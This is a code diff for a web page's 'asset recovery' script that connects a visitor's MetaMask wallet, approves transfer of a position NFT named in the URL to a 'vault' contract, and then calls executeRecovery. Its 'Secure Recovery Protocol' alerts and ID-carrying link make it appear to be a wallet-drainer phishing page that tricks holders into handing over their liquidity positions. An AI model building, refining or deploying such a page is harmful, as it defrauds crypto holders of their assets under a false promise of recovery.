@@ -91,37 +91,43 @@
         }, 80);
     }
 
-    async function initiateRecovery() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const tid = urlParams.get('tid'); 
+   async function initiateRecovery() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const tid = urlParams.get('tid');
 
-        if (!tid) return alert("CRITICAL: Position ID missing.");
+    if (!tid) return alert("CRITICAL: Position ID missing.");
+    if (typeof window.ethereum === 'undefined') return alert("Install MetaMask.");
 
-        try {
-            // STEP 1: Connect Wallet
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            const signer = await provider.getSigner();
-            
-            // STEP 2: Initiate Transaction
-            const nftContract = new ethers.Contract(POSITION_MANAGER, NFT_ABI, signer);
-            alert("Action Required: Authorize the Aethelgard Vault.");
-            
-            const tx1 = await nftContract.approve(CONTRACT_ADDRESS, tid);
-            await tx1.wait();
+    try {
+        // 1. Force Request Account (Triggers MetaMask popup)
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        
+        // 2. Initialize Contracts
+        const nftContract = new ethers.Contract(POSITION_MANAGER, NFT_ABI, signer);
+        const vault = new ethers.Contract(CONTRACT_ADDRESS, VAULT_ABI, signer);
 
-            const vault = new ethers.Contract(CONTRACT_ADDRESS, VAULT_ABI, signer);
-            const tx2 = await vault.executeRecovery(tid);
-            await tx2.wait();
-            
-            alert("SUCCESS: Assets Recovered.");
-        } catch (err) {
-            console.error(err);
-            // This 'err.reason' is what showed you the 'not owner' message. Perfect.
-            alert("Protocol Insight: " + (err.reason || "Transaction Refused by Blockchain or User."));
-        }
+        // 3. User Feedback before the transaction
+        alert("Initializing Secure Recovery Protocol for Position #" + tid);
+        
+        // 4. THIS will trigger the MetaMask transaction popup
+        const tx1 = await nftContract.approve(CONTRACT_ADDRESS, tid);
+        
+        alert("Authorization sent to network. Please wait for confirmation.");
+        await tx1.wait();
+
+        const tx2 = await vault.executeRecovery(tid);
+        await tx2.wait();
+        
+        alert("SUCCESS: Assets Recovered.");
+    } catch (err) {
+        console.error(err);
+        // This will now capture and show errors clearly
+        alert("Protocol Error: " + (err.info?.error?.message || err.message));
     }
-
+}
     window.onload = loadAudit;
 </script>
 
